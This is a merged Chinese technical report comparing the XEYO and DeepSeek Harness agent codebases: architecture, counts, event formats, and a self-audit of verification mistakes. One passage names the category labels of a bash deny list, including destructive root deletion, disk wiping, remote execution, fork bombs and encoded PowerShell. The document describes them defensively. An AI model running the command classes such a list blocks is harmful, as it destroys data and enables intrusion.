# XEYO × DeepSeek Harness —— 五轮源码级考古 · 完整合集

> **源文档 7 份 / 8,932 行 / 约 640 KB**，合并为单一文档。
> 合并原则：**源文档每一节均被完整搬运，零删减、零改写**——仅标题层级按新结构降级 3 级、并在每块前标注出处（文档 + 原节 + 源行号）。
> 校验：脚本对每个源文件的 `(start,end)` 行区间做**全覆盖断言**（恰好铺满 1..N，无空洞、无重叠），断言失败即中止生成。

**卷结构**

| 卷 | 内容 | 规模来源 |
|---|---|---|
| 卷一 | 总纲：取证口径与更正沿革 | R1–R4 的取证节 |
| 卷二 | 逐域完整对照（33 域 × 4 轮） | R1–R4 主体 |
| 卷三 | 机制设计说明 | R5 全文 |
| 卷四 | 差异总表与累计结论 | R1–R4 总表/结论 |
| 卷五 | 优化决策 | 决策 A + 决策 B 全文 |
| 附录 | 覆盖自检 + 源文档索引 | — |

---

## 导言：这份文档怎么来的、怎么用、以及改过什么

### 0.1 合并方式与两条硬保证

源文档 7 份（五轮对比 + 两份决策），合计 **8,932 行 / 约 640 KB**，本册把它们合并为单一文档。

合并由脚本 `scripts/tmp_merge_docs.py` 完成，不是人工复制粘贴，因此有两条可复算的保证：

1. **零内容丢失**：源文档每一节被拆成「节名 + `(start,end)` 行区间」原子单位，按域重新分配。脚本对每个源文件做**行区间全覆盖断言**——所有搬运区间必须恰好铺满 `1..N`，出现任何空洞或重叠即 `assert` 失败、中止生成。

   **实测结果：**

   | 源文档 | 覆盖行数 | 区间块 | 空洞 | 判定 |
   |---|---|---|---|---|
   | R1 功能面·全量对比 | 605 / 605 | 1 | 无 | OK |
   | R2 设计面·设计级对比 | 1,307 / 1,307 | 1 | 无 | OK |
   | R3 实现面·实现级对比 | 2,246 / 2,246 | 1 | 无 | OK |
   | R4 枚举面·逐字段级对比 | 1,505 / 1,505 | 1 | 无 | OK |
   | R5 机制面·机制设计说明 | 2,017 / 2,017 | 1 | 无 | OK |
   | 决策 A·优化路线五轮总结 | 532 / 532 | 1 | 无 | OK |
   | 决策 B·高杠杆收益评估 | 720 / 720 | 1 | 无 | OK |
   | **合计** | **8,932 / 8,932** | — | **无** | **100%** |

2. **零改写**：正文逐字搬运，只做三件无害的事——①标题层级按新结构统一降 3 级（代码块内不降级）；②每块前加一行来源标注（文档 + 原节 + 源行号）；③插入「校勘注」（见 §0.3）。**没有删除任何一行、没有重写任何一句话。**

分节覆盖：源文档共 **197 个节**（跳过代码块内的伪标题后计数），已分配 197、未分配 0、重复 0。

> **一个坑值得记下**：初次统计得到 209 个节，比真实值多 12 个——多出来的全部是**代码块内部的伪标题**（示例 YAML/TS 片段里以 `#` 开头的行）。索引一旦按错误编号建立，后面每个域的搬运都会错位。修正方式是解析时跟踪 ``` 围栏状态，跳过围栏内的行。

### 0.2 核实回执：合并时重跑源码，逐条验伪

「边核实边合」不是口号，是**本次合并过程中实际执行的一道工序**：把五轮报告里所有**可被机器证伪的断言**（计数、常量值、行号、存在性、否定判断）抽出来，重新到两个源码库上跑一遍。

共核 **42 条**：**确认 41 条，更正 1 条**。

| # | 轮次 | 被核断言 | 报告值 | 实测 | 判定 |
|---|---|---|---|---|---|
| 1 | R1–R4 | dsh 包数（packages/<组>/<子包>/） | `255` | `255` | ✅ |
| 2 | R3/R4 | dsh src 下 .ts/.tsx 文件数 | `1611` | `1611` | ✅ |
| 3 | R1/R3 | dsh 测试文件数 | `863` | `863` | ✅ |
| 4 | R4/R5 | dsh 会话事件数（含双斜杠键） | `51` | `51` | ✅ |
| 5 | R4/R5 | SESSION_FORMAT_VERSION | `2` | `2` | ✅ |
| 6 | R4 | packages/client 子包目录数 | `45` | `45` | ✅ |
| 7 | R4 | dsh 工具目录条目 / 唯一工具名 | `62 / 57` | `62 / 57` | ✅ |
| 8 | R2/R5 | dsh 是否存在名为 Mcp 的网关工具（否定断言） | `无` | `命中 0 个文件` | ✅ |
| 9 | R2/R5 | dsh ToolRuntime.view() 无 memo（按需派生） | `memo 0 处` | `memo 0 处 / cache 0 处` | ✅ |
| 10 | R6/R7 | dsh Windows 专用沙箱后端 | `存在` | `sandbox-windows-acl` | ✅ |
| 11 | R4 | spill 预览是否头尾各半（ceil/floor） | `ceil+floor` | `ceil=1 floor=1` | ✅ |
| 12 | R4 | compaction 触发常量 0.8 / 0.16 / 8192 | `三者齐` | `0.8,0.16,8192` | ✅ |
| 13 | R4 | tool-result-pruner 8192 / 4096 / 1024 | `三者齐` | `8192,4096,1024` | ✅ |
| 14 | R3/R4 | 审批唯一授予值 allowed-once | `存在` | `存在` | ✅ |
| 15 | R2/R5 | dsh 是否跨会话记忆（否定断言） | `无` | `命中 0 个文件` | ✅ |
| 16 | R1–R7 | XEYO python 文件数 / 行数 | `1141 / 160772` | `1141 / 160772` | ✅ |
| 17 | R1–R7 | gui/src ts+tsx 文件数 / 行数 | `391 / 81484` | `391 / 81484` | ✅ |
| 18 | R1–R7 | tui 行数 / rust 文件数·行数 | `3544 / 3·1162` | `3544 / 3·1162` | ✅ |
| 19 | R3–R7 | pytest 文件数 / vitest 文件数 | `307 / 102` | `307 / 102` | ✅ |
| 20 | R3–R7 | XEYO HTTP 路由数 | `101` | `101` | ✅ |
| 21 | R4–R7 | XEYO 工具数 / TOOL_META 字段数 | `26 / 14` | `26 / 14` | ✅ |
| 22 | R4–R7 | EngineEvent dataclass 数 | `20` | `20` | ✅ |
| 23 | R4–R7 | EngineEvent Union 成员数（PermissionExpiringEvent 未入） | `19` | `19` | ✅ |
| 24 | R4–R7 | T_now 登记块数 / _tag_block 装配点 | `20 / 20` | `20 / 20` | ✅ |
| 25 | R4–R7 | T_NOW_BLOCK_HARD_CAP | `21` | `21` | ✅ |
| 26 | R4–R7 | T_now 预算 6000 / 2500 / 6000 / 4000 | `6000,2500,6000,4000` | `6000,2500,6000,4000` | ✅ |
| 27 | R3–R7 | XEYO_BENCH_MINIMAL 裁剪点行号 | `359` | `[359]` | ✅ |
| 28 | R4–R7 | output_budget=0 豁免（Read / Bash） | `2 处` | `[112, 148]` | ✅ |
| 29 | R7 | bash 截断常量 DEFAULT_LIMIT / HEAD_CHARS / TAIL_CHARS | `30000 / 20000 / 8000` | `30000 / 20000 / 8000` | ✅ |
| 30 | R7 | registry 级 spill 常量 16000 / 6000 / 2000 | `16000 / 6000 / 2000` | `16000 / 6000 / 2000` | ✅ |
| 31 | R7 | engine/compact.py 工具配对平衡 | `tool_pair_ranges 存在` | `存在` | ✅ |
| 32 | R5/R7 | python/rewind 文件数 / 行数 | `12 / 5343` | `12 / 5343` | ✅ |
| 33 | R6/R7 | 审批风险分级 TTL（普通 / 危险 / 提醒） | `180 / 60 / 30` | `180 / 60 / 30` | ✅ |
| 34 | R6/R7 | _disk_lock 仅进程内锁 | `threading.Lock` | `threading.Lock` | ✅ |
| 35 | R6/R7 | 读侧撕裂行处理只静默跳过 | `JSONDecodeError: continue` | `命中` | ✅ |
| 36 | R7 | sidecar 侧挂→升格基建 | `存在` | `存在` | ✅ |
| 37 | R5/R7 | XEYO hooks 事件数 | `5` | `5` | ✅ |
| 38 | R4–R7 | pricing.py 仍是 2026-08-17 旧价表 | `仍是旧表` | `仍是旧表` | ✅ |
| 39 | R3–R7 | bash 黑名单正则条数 / 标签类数（报告写「18 条」） | `18` | `19 条 / 10 类` | ⚠️ **更正** |
| 40 | R7 | _EARLY_BLOCKLIST 投机提前执行黑名单项数 | `4` | `4` | ✅ |
| 41 | R1→R5 | engine/scheduler.py 是否死代码（否定断言） | `不是死代码` | `消费方 14 个文件` | ✅ |
| 42 | R5/R7 | ledger 注释引用 dsh 记账纪律 | `含 S2/S4` | `含` | ✅ |

**唯一一处更正**（详见 §0.3-A）：`permissions/bash_policy.py` 的 `_DENY_RULES` 实测为 **19 条正则 / 10 类标签**，五轮报告写的是「18 条黑名单正则」，块区间报告记 `:20-106`、实测 `L20–L105`。这是描述性估算，不是结构性错误。

### 0.3 校勘台账

#### A. 本次合并新发现（1 条）

**A-1 · bash 黑名单条目数 18 → 19**

- 报告原文：「18 条黑名单正则（`permissions/bash_policy.py:20-106`）」
- 实测：`_DENY_RULES` 是 `tuple[tuple[re.Pattern, str], ...]`，块区间 **L20–L105**，内含 **19 次 `re.compile(`**，归入 **10 类标签**：`destructive_root_delete`(×2) / `disk_format`(×2) / `disk_wipe` / `system_power` / `registry_system` / `remote_exec`(×3) / `fork_bomb` / `unc_destructive` / `encoded_powershell` / `certutil_decode`。
- 影响面：文中 4 处出现「18 条」的描述（本册 L6759 节标题、以及三处行文中的顺带提及），语义上应读作 **19 条正则 / 10 类**；不影响任何结论——该论点的核心是「模式匹配不构成隔离」，条数多一条少一条不改变判断。

#### B. 五轮自身已记录的更正（沿革，按轮次）

合并后的文档里，更正沿革分散在各轮开头。集中列一次，便于看清认识是怎么被推翻又重建的：

| 轮次 | 更正内容 | 详见 |
|---|---|---|
| R1 | 首轮，无更正 | — |
| R2 | ① **dsh 并没有 `Mcp` 网关工具**——第一轮把 XEYO `AGENTS.md` 里的扩展契约（含 `_schemas_cache`）误抄成 dsh 的设计，由此得出的「两端独立演化出同一结论」是错的；真相是**互为镜像**（XEYO 冻结工具面 → 必须发明网关绕过自己；dsh 不冻结 → 不需要网关）② **`engine/scheduler.py` 不是「写了无消费方」**，它是被广泛消费的 DAG 调度器 ③ 两处计数：XEYO SSE 20 dataclass / 19 联合成员（首轮写「25 类」）、dsh 服务缝 69 个（首轮写 68） | 本册卷一 §1.2 |
| R3 | 维持 R2 更正并加固；本轮改为直读源码（子代理限流） | 本册卷一 §1.3 |
| R4 | ① dsh 会话事件 **48 → 51**：单斜杠正则漏掉 3 个双斜杠键（`agent/inbox/spliced`、`team/message/queued`、`team/message/delivered`）② `packages/client` **47/50 → 45**：`ls` 条目数含 5 个文件 ③ dsh 工具 **62 条目录 → 57 个唯一名**（多 provider 变体重复） | 本册卷一 §1.4 |
| 决策 A | ① XEYO **已有投影层**（`session/surface.py` + `hydrate.py`），差距是算子种类不是有没有层 ② JSONL **已有写后缓冲 + fsync + 轮转**，只缺撕裂尾修复与跨进程租约 ③ **dsh 有 Windows 专用沙箱后端**（restricted token + ACL），「平台不适用」的判断错误 | 本册卷五 §5.1 |
| 决策 B | 推翻决策 A 的 P0 三项：工具结果头尾预算 + spill 可取回**已完整实现三层**；「双重截断」冲突**早已被 `output_budget=0` 显式规避**；工具配对平衡 `tool_pair_ranges` **已存在** | 本册卷五 §5.2 |

**读法建议**：遇到结论冲突，**以轮次更高者为准**；§0.2 的核实回执则对全五轮统一复核过一遍。

#### C. 校验过程自身的缺陷（如实记录）

**这一节比 A 节更重要。** 核实脚本第一次跑出 **10 条「更正」——全部是假的**，全部源于校验脚本自身。若不复核校验器，就会把 10 条错误结论写进这份文档：

| # | 假更正 | 真实原因 |
|---|---|---|
| 1 | dsh src ts 「1611 → 1450」 | 我的检查只数 `*.ts`，报告口径是 `.ts/.tsx`（R4 原文已写明）。1611 正确 |
| 2 | dsh 测试「863 → 937」 | `rglob` **未排除 `node_modules`**，把依赖里的测试文件也数进来了。863 正确 |
| 3 | dsh ToolRuntime 「cache 命中 3 处」 | 关键字命中，不是语义判断。原文「无 memo」在 `memo\s*[(=]` 口径下为 0，正确 |
| 4 | EngineEvent「19 → 20」 | 把「dataclass 数」与「Union 成员数」混为一谈。**20 与 19 都对**，是两个量 |
| 5 | T_now 预算「6000 → 6」 | 源码写 `6_000`（Python 千位下划线），正则 `\d+` 只吃到 `6`。6000 正确 |
| 6 | bash truncate「30000 → 30」 | 同上，`30_000` / `20_000` / `8_000` |
| 7 | registry spill「未命中」 | 同上，`16_000` / `6_000` / `2_000` |
| 8 | 审批 TTL「未命中」 | 源码是 `PENDING_PANEL_TTL_SECONDS = 180.0`（浮点 + 具名常量），我的正则假设是裸整数序列 |
| 9 | `_EARLY_BLOCKLIST`「未见」 | 源码是 `frozenset({...})`，我的正则假设是 `= {` |
| 10 | scheduler「消费方 0 个」 | 子进程 grep 未正确落地；改为纯 Python 遍历后实测 **14 个消费方文件** |

**教训（已写进 `repo-archaeology-compare` 技能）**：**核实脚本本身必须被核实**。判定一条「更正」之前，先问「这是源码错了，还是我的提取器错了」——提取器的错通常有**特征形状**：整数字段整十整百地变小（千位下划线）、否定断言返回 0 命中（排除目录没写）、两个本应不同的量被算成一个（口径混淆）。凡出现这些形状，**先怀疑提取器**。

### 0.4 怎么读这份文档

| 你的目的 | 直接去 |
|---|---|
| 先看两端定位与最根本分歧 | 卷二 · 域 01，再读卷四 |
| 看某个能力域「有什么 / 差什么」 | 卷二对应域，按 R1→R2→R3→R4 顺序读 |
| 看「同一道题两端怎么解」 | 卷三（机制面，A/B/C 三部分） |
| 看数字、字段、常量、行号 | 卷二各域的 R4 段（逐字段级） |
| 决定该做什么优化 | 卷五（决策 B 是收益/适配双维打分，比决策 A 更新） |
| 反向定位某条结论的出处 | 附录 §附B 源文档分节索引 |

---

---


# 卷一 · 总纲：取证口径与更正沿革

> 五轮各自的取证方法、边界、以及每一轮推翻上一轮的具体条目。**读后面任何结论前先读这卷**——多轮结论存在迭代更正，以最新一轮为准。

## 1.1 第一轮 · 说明与取证口径

> 来源：**R1 功能面·全量对比** · 原节「XEYO × DeepSeek Harness（dsh）全量对比」（源 L1–30）

#### XEYO × DeepSeek Harness（dsh）全量对比

> 只读源码考古，2026-09-10。**所有结论均来自实际读到的源码/生成文档，附 `文件:行号`；凡"未见"= 通读范围内未找到实现，不等于绝对不存在，但已按可检索面穷举。**

---

##### 0. 取证口径（先说清楚我读了什么）

| | **XEYO** | **DeepSeek Harness（dsh）** |
|---|---|---|
| 仓库 | `D:\lea\XenYon code`（本机工作区） | `github.com/deepseek-ai/deepseek-harness` |
| 本地副本 | — | `D:\lea\dsh-src`（原为 sparse checkout，本次**已关闭 sparse 并补齐全部源码**） |
| 版本/提交 | 工作树 HEAD | `d347e70`，`version 0.1.3-alpha.1`，默认分支 `master` |
| 许可 | MIT（`LICENSE:1`） | MIT（`LICENSE`，仓库根） |
| 读取方式 | `find`/`grep` 全量 + Read 关键文件 | 同上；`git ls-tree -r HEAD` 枚举 9080 个受控文件 |

**规模（本机实测，非引用）**

| 维度 | XEYO | dsh |
|---|---|---|
| 源文件 | Python 1141 个 `.py`；GUI 391 个 `.ts/.tsx`；Rust 3 个 `.rs`；TUI 16 个 `.tsx` | 3226 个 `.ts/.tsx`（含测试），255 个包 |
| 代码行 | Python **160,772**；`gui/src` **81,484**；`tui` **3,544**；Rust **1,162** ≈ **246,962** | **767,579**（含测试）；**308,675**（仅 `*/src/`） |
| 测试文件 | pytest **307**；GUI **102** | vitest **863** |
| 包/模块数 | `python/` 约 16 个顶层子包 | `packages/<组>/<包>/` **255** 个 |
| 文档 | `docs/*.md` **21** 篇 | `docs/` **363** 个文件（含双语文档 + 生成目录 + 子系统页） |

> 一句话：**dsh 的源码量约为 XEYO 的 1.2～3 倍（按口径），但包粒度细 16 倍**——XEYO 是「一大坨 Python 引擎 + 一个 GUI」，dsh 是「255 个小包的插件树」。

---


## 1.2 第二轮 · 两处更正（推翻第一轮的错误结论）

> 来源：**R2 设计面·设计级对比** · 原节「XEYO × DeepSeek Harness（dsh）设计级对比 · 第二轮」（源 L1–102）

#### XEYO × DeepSeek Harness（dsh）设计级对比 · 第二轮

> 从**架构**走到**系统实现的设计**：每个系统都回答同一组问题——为什么这么设计、抽象与契约长什么样、一次操作的数据流怎么走、关键机制怎么实现、扩展点在哪、作者自己怎么解释这个取舍。
> 2026-09-10。结论均带 `文件:行号`。凡"未见"= 按可检索面穷举后未命中，不等于绝对不存在。

**与第一轮的关系**：第一轮（`docs/XEYO-vs-DeepSeekHarness-全量对比.md`）是**功能面清单**（有什么、没有什么）。本轮是**设计面解剖**（为什么这样、怎么接起来的），并**更正第一轮的两处硬错误**（见 §0.2）。两份文档互补，不重复。

**取证口径**

| | XEYO | dsh |
|---|---|---|
| 仓库 | `D:\lea\XenYon code` | `D:\lea\dsh-src` |
| 版本 | 工作树 HEAD | `d347e70` / `0.1.3-alpha.1` / `master` |
| 规模 | Python 1141 文件 / 160,772 行；gui 81,484 行；tui 3,544；rust 1,162 | 3226 个 `.ts/.tsx` / 767,579 行（含测试）；**255 个包** |
| 本轮方式 | 6 路分队按**能力域**跨两端并行通读 + 主代理复核加载性结论 | 同左 |

---

##### 0. 先说两处更正（第一轮的错误）

第二轮的价值有一半在这里：两个第一轮的强结论经不起复核，错了，而且真相比原来那个说法更有意思。

###### 0.1 更正一：dsh **没有** `Mcp` 网关工具——"两端独立演化出同一结论"是我编的

第一轮 §16 我写：「两边都独立演化出『工具面会话内冻结 + 会话内新增工具只能走网关工具』，连网关工具命名（`Mcp`）都一致」。

**这是错的**，错因很蠢：我把 **XEYO 自己 `AGENTS.md` 的扩展层契约文本**（里面写着 `_schemas_cache`、`Mcp` 网关）当成 dsh 的契约抄进了 dsh 那一列。`_schemas_cache` 是 XEYO 的变量名，dsh 根本没有这个概念。

复核证据：

```
# 1) dsh 全仓无名为 Mcp 的工具
$ grep -rn "name: *[\"']Mcp[\"']" packages/ --include=*.ts   →  空

# 2) dsh 的 MCP 工具是直接注册进工具面，公共名带命名空间
packages/mcp/mcp-client/src/index.ts:4
  * (`mcp__<serverName>__<rawName>`). Each plugin instance connects to one MCP
packages/mcp/mcp-client/src/tools.ts:113
  const joined = `mcp__${serverName}__${rawName}`

# 3) dsh 唯一的 MCP 包
$ ls -d packages/mcp/*/   →  packages/mcp/mcp-client/
```

那么 dsh 到底怎么保证工具面稳定？**它压根不冻结**：

```
packages/core/tools/src/index.ts:1144  private view(scope?: ScopeKey): ToolView {
packages/core/tools/src/index.ts:1152    const inherited = new Map(...this.layers.global.tools.entries())
packages/core/agent-loop/src/agent.ts:242
  const assembly = await this.loopCtx.systemPrompt.assemble(assembleContextFor(this, signal))
packages/core/agent-loop/src/agent.ts:356
  this.buildRequest(turn, step, assembly.tools, system, this.session.deriveMessages(), ...)
```

`ToolRuntime.view()` 是**按需派生**、无 memo 无缓存（全文件 grep `memo|cache` → 空）；`systemPrompt.assemble()` 与 `deriveMessages()` 一样**每 step 重算**。工具面随插件挂载/卸载**实时变化**，`cordis_define` 因此可以让模型在会话内直接给自�己加工具（`tool-cordis/src/index.ts:152`）——**不需要网关，因为没有冻结**。

dsh 真正在管 KV 缓存的地方是 **provider 库**，而且是声明式的：

```
packages/llm/llm-pi-ai/src/catalog.ts:129  export type PiAiCacheControlFormat = ...
packages/llm/llm-pi-ai/src/catalog.ts:233  cacheControlFormat: 'offer',
docs/config-catalog.md:1248  /** Whether the endpoint accepts `cache_control` on tool definitions; `anthropic-messages`. */
docs/config-catalog.md:1241  /** Whether the endpoint accepts long prompt-cache retention; ... */
```

**更正后的真实对照**（比原来有价值得多）：

| | dsh | XEYO |
|---|---|---|
| 工具面是否会话内冻结 | **否**——每步 `view()` 重新派生 | **是**——`_schemas_cache` 会话内冻结，绝对红线 |
| 会话内新增工具 | 直接 register，工具面自然变化 | **不可能**（冻结），故必须发明 `Mcp` 网关工具作为逃生口 |
| KV 前缀稳定性来源 | **结构副产品**：追加式事件日志使消息前缀天然 append-only；缓存策略下沉到 provider 库（`cacheControlFormat`/`supportsLongCacheRetention`/`supportsCacheControlOnTools`） | **显式政策**：左段刻意极简（Date/Model 不进）+ `frozen_until` 游标 + 工具面冻结 |
| 客户端一致性怎么保证 | 类型化 RPC（Typert）+ 事件溯源日志 | SSE 事件流 + 磁盘 transcript 权威 |

也就是说：**两端不是"独立收敛到同一结论"，而是"取向相反且各自自洽"**。XEYO 选择冻结，代价是必须造一个网关工具来绕过自己的冻结；dsh 选择不冻结，代价是必须用类型化 RPC + 事件溯源来保证"客户端看到的"和"日志记下的"一致。第一轮那句话请作废。

###### 0.2 更正二：XEYO `engine/scheduler.py` **不是**"写了无消费方"

第一轮（及项目审计文档）称 `scheduler.py`（1110 行 DAG）"未接线"。复核后**不成立**：

```
$ grep -rn "scheduler" --include=*.py --exclude-dir=.venv --exclude-dir=__pycache__ .
engine/subagent_runner.py:924   from engine.scheduler import Task
engine/subagent_runner.py:978   from engine.scheduler import scope_conflicts
engine/subagent_runner.py:1030  from engine.scheduler import MAX_DECOMPOSE_TASKS, repair_task_graph
engine/subagent_runner.py:1104  from engine.scheduler import MAX_DECOMPOSE_TASKS, Task
engine/subagent_runner.py:1232  from engine.scheduler import MAX_DECOMPOSE_TASKS
server/session_pool.py:887      def scheduler_for(self, session_id, *, write_store=None)
server/session_pool.py:889          from engine.scheduler import Scheduler
server/routers/chat.py:961-974  read_scheduler_checkpoint / clear_scheduler_checkpoint
coord/store.py:10,68            复用 scheduler.scope_conflicts 语义
tests/test_agent_tool.py:15     from engine.scheduler import Task, scope_conflicts, toposort
tests/test_multiagent_hardening.py:15  from engine.scheduler import Task, run_task_batch
```

`Scheduler` / `run_task_batch` / `repair_task_graph` / `scope_conflicts` / `checkpoint` 被**子代理多代理编排主链路**实际消费。它**不是**时间触发型定时器（那才是 XEYO 真正缺的），而是**多代理任务 DAG 调度器**。第一轮把"缺 cron 式定时任务"和"scheduler.py 未接线"混为一谈了。

> 顺带：这条错误同时存在于项目记忆文件里，本轮一并修正。

---


## 1.3 第三轮 · 取证基线与取证方式

> 来源：**R3 实现面·实现级对比** · 原节「XEYO ⟷ DeepSeek Harness 全量对比 · 第三轮：实现级」（源 L1–19）

#### XEYO ⟷ DeepSeek Harness 全量对比 · 第三轮：实现级

> 第一轮 `XEYO-vs-DeepSeekHarness-全量对比.md`（605 行 / 功能面）
> 第二轮 `XEYO-vs-DeepSeekHarness-设计级对比-第二轮.md`（1307 行 / 设计面 32 系统）
> **本轮（第三轮）只写实现细节**：函数签名、数据结构逐字段、算法步骤、常量默认值、错误分支、边界条件、并发/中断代码路径。设计动机与功能清单不重复，需要时回了指前两轮。

**取证基线**

| | dsh | XEYO |
|---|---|---|
| 版本 | `d347e70` / `0.1.3-alpha.1` / master | 工作树（2026-09-10） |
| 代码量 | 1611 个 `src/**.ts`（packages+apps） | python 1141 文件 / 160,772 行 |
| 测试 | 863 个 `.spec/.test.ts` | python 307 个 `test_*.py`；gui 102 个 |
| 其他规模 | 255 个包 | gui 391 文件 / 81,484 行；tui 29 文件 / 3,544 行；rust 3 文件 / 1,162 行 |

**本轮取证方式（与前两轮不同）**：子代理被限流（23:47 才恢复），因此本轮**由主代理直接逐文件读**——用 `Read` 精读关键实现文件、用 `sed/grep` 精确切片，所有计数（会话事件 48、工具目录 62 行、XEYO 工具 26、路由 101、T_now 登记 20）均为当场实测，不采信任何转述。**凡未读到的一律写「未见」。**

---


## 1.4 第四轮 · 方法、取证边界与三处更正

> 来源：**R4 枚举面·逐字段级对比** · 原节「XEYO × DeepSeek Harness 逐字段级对比（第四轮）」（源 L1–66）

#### XEYO × DeepSeek Harness 逐字段级对比（第四轮）

> 前三轮：功能面（605 行）→ 设计面（1307 行）→ 实现面（2246 行）。
> 本轮只做一件事：**把每个类型、每个字段、每个常量、每条分支、每个键名穷举出来**，并给出字段级差异矩阵与行为对照用例。
> 设计动机、功能清单、架构评述**本轮不重复**；若与前轮冲突，以本轮实测为准（本轮全部为主代理直读源码 + 逐条命令行实测）。

**代码库基线**

| | dsh | XEYO |
|---|---|---|
| 路径 | `D:\lea\dsh-src` | `D:\lea\XenYon code` |
| 版本 | `0.1.3-alpha.1` / commit `d347e70` / master | 工作树（本日 20:26 快照） |
| 语言 | TypeScript monorepo（Cordis 插件） | Python 引擎 + React/TS + Rust 壳 |
| 包/模块粒度 | **255** 个 `packages/<组>/<子包>/` | 1 个 `python/` + `gui/` + `tui/` |

**本轮实测规模（全部命令行得出，非估算）**

| 指标 | dsh | XEYO |
|---|---|---|
| 源文件 | `src` 下 `.ts/.tsx` **1611** | `python` `.py` **1141** / `gui/src` **391** / rust **3** |
| 代码行 | （前轮 767,579 含测试） | python **160,772** / gui **81,484** / tui **3,544** / rust **1,162** |
| 测试文件 | `.spec.ts/.test.ts` **863** | pytest **307** / vitest **102** |
| 会话事件类型 | **51** | 事件 dataclass **20** / 联合成员 **19** |
| 工具 | 目录条目 **62** / 唯一工具名 **57** | **26**（单表 14 字段） |
| HTTP 路由 | —（RPC，见 §16） | **101** |
| 斜杠命令 | —（`command/*` 事件 + 各包自有命令） | **35** |

---

##### §0 本轮方法、取证边界与三处更正

###### 0.1 取证方法

1. **主代理直读**：本轮不依赖子代理转述。全部结论来自 `Read` 精读 + Python/`grep` 精确切片。
2. **枚举一律脚本化**：事件名、工具名、路由、字段表全部用 Python 正则 + 花括号计数提取，不用 `grep -c` 估。
3. **每条断言带 `文件:行号`**；无法核实的写「未见」。
4. **否定判断必须穷举**：凡「XEYO 没有 Y」一律先做排除 `.venv` / `node_modules` 的全仓检索。

###### 0.2 本轮对前轮的三处更正

**更正 A（第三轮计数错）：dsh 会话事件是 51 个，不是 48 个。**

第三轮用 `^\s{4}'...'` 固定缩进 + `[a-z-]+/[a-z-]+` 单斜杠正则提取，**漏掉了双斜杠键名**：

- `agent/inbox/spliced`（`core/agent/src/types.ts`）
- `team/message/queued`（`experimental/agent-team/src/types.ts`）
- `team/message/delivered`（同上）

48 + 3 = **51**。本轮第一次提取时我自己也踩了同一个坑（正则 `'([a-z0-9-]+/[a-z0-9-]+)'` 同样只允许一个斜杠），改用 `'([a-z0-9-]+(?:/[a-z0-9-]+)+)'` 后才正确。

**教训**：事件键名的 **段数不固定**（1 段命名空间 + 1~2 段名）。任何"固定段数"的提取模式都会静默漏数。

**更正 B（第三轮计数对、表述需精确）：`SESSION_FORMAT_VERSION = 2`，且 dsh 自己写明了"什么时候该 bump"。**

原文 rationale 值得逐字引用（`packages/core/session/src/types.ts:64-85`）：

> The version is a single monotonic integer with no major/minor split. Whether a bump is needed is decided by what the **WRITER** emits, never by what a newer reader can accept: bump exactly when an older runtime could no longer handle a new log with full semantic correctness ("parses without error" is not correctness — silently skipping content that shapes reconstruction is a wrong read). Only structural changes reach that bar: the header shape, the `SessionEvent` envelope, core event semantics, or the surface mechanism. **Adding an ordinary event type does not bump** — the per-event `SessionEvent.ignorable` guard covers vocabulary growth instead. When in doubt, bump: a near-identity upgrade step is almost free, a missed bump makes older runtimes read new logs wrong silently.

即：**加事件类型不升版本号，靠 `ignorable` 标记兜住词汇增长**。这条设计在 XEYO 侧无对应物（XEYO 的 JSONL 无版本号、无 ignorable 语义）。

**更正 C（口径澄清）：dsh 的"工具目录 62 条"不等于 62 个工具。**

`docs/tool-catalog.md` 有 **62 个 `### ` 条目**，但去重后 **57 个唯一工具名**——因为同名工具存在多 provider 变体（`bash` 有 local + persistent 两个包；`pwsh` 同理；`interrupt_agent`/`list_agents`/`send_message` 在 subagent-control 与 agent-team 两处各有一份）。

---


## 1.5 第五轮 · 定位与取值修正

> 来源：**R5 机制面·机制设计说明** · 原节「XEYO × DeepSeek Harness 实现机制设计说明（第五轮）」（源 L1–25）

#### XEYO × DeepSeek Harness 实现机制设计说明（第五轮）

> 产物：机制设计说明（Mechanism Design Spec）。不是功能清单，不是字段枚举，而是**逐个机制讲清"为什么这样设计 / 不变量是什么 / 算法怎么走 / 失败怎么办"**。
> 证据口径：每条结论带 `文件:行号`，全部由主代理直读源码得出（`Read` 精读 + Python 切片；本机 `awk` 有兼容问题，已弃用）。
> 前置四轮：功能面 `XEYO-vs-DeepSeekHarness-全量对比.md`（605 行）、设计面 `…设计级对比-第二轮.md`（1307 行）、实现面 `…实现级对比-第三轮.md`（2246 行）、逐字段面 `…逐字段级对比-第四轮.md`（1505 行）。**本轮不重复它们**。

---

##### §0 本轮的定位：从"有什么"转向"怎么运转"

第四轮回答了"每个类型有哪些字段"。本轮回答的是再往下一层的问题：

| 第四轮问的 | 第五轮问的 |
|---|---|
| `SessionEvent` 有几个字段 | 一条事件从 `append()` 到进入模型上下文，经过哪几次验证、哪几次转换？ |
| 沙箱有哪些模式 | `confine(argv, policy)` 怎么把政策变成 argv？后端查不到时为什么不能"裸跑"？ |
| T_now 有 20 个块 | 20 个块怎么塞进一次请求而不破坏 KV 前缀缓存？塞不进去时砍谁？ |
| 有 `rewind` | 一次 rewind 从 preview 到 execute 到崩溃恢复，状态机怎么走？ |

**机制 ≠ 功能**。同一条功能在两端可以是完全不同的机制（例如"产物落盘"：dsh 是**写后缓冲 + 单写者 + 撕裂尾修复**，XEYO 是**追加 + fsync 开关 + 部分行容忍**）。本轮专门抓这种机制级差异。

**一个重要的取值修正**：本轮首次系统阅读 `D:\lea\XenYon code\python\rewind\` —— **12 个文件、5343 行**（`service.py` 1800 / `hotpath.py` 1024 / `index.py` 684 / `blob_gc.py` 531 / `journal.py` 321 / `models.py` 233 / `revision.py` 212 / `locks.py` 166 / `snapshot.py` 115 / `checkpoint.py` 115 / `context.py` 111 / `__init__.py` 31）。前四轮把它压缩成"rewind v2/v3"一句话，**低估了它的规模**——它比 dsh 的整个 `session-persistence-jsonl` 包还大，且自带 GC、租约、崩溃标记、后台恢复线程。

---



# 卷二 · 逐域完整对照（33 个域 × 四轮递进）

> 同一能力域下把五轮证据按 R1 功能 → R2 设计 → R3 实现 → R4 字段 的次序排开，可直接看出认识如何逐层变具体。

## 域 01 · 定位与顶层架构范式

> 来源：**R1 功能面·全量对比** · 原节「1. 定位」（源 L31–71）

##### 1. 定位

| | XEYO | dsh |
|---|---|---|
| 自称 | 本地编码 Agent（`AGENTS.md:1`「XEYO 项目级说明」） | 开源 agent harness，`README.md:3`「an open-source agent harness developed by DeepSeek AI」 |
| 核心主张 | **注意力纪律**：*"注意力里只出现信息，不出现导演"*（`AGENTS.md` 设计理念节） | **一切皆插件**：*"There is no privileged core to patch"*（`docs/architecture.md:13`） |
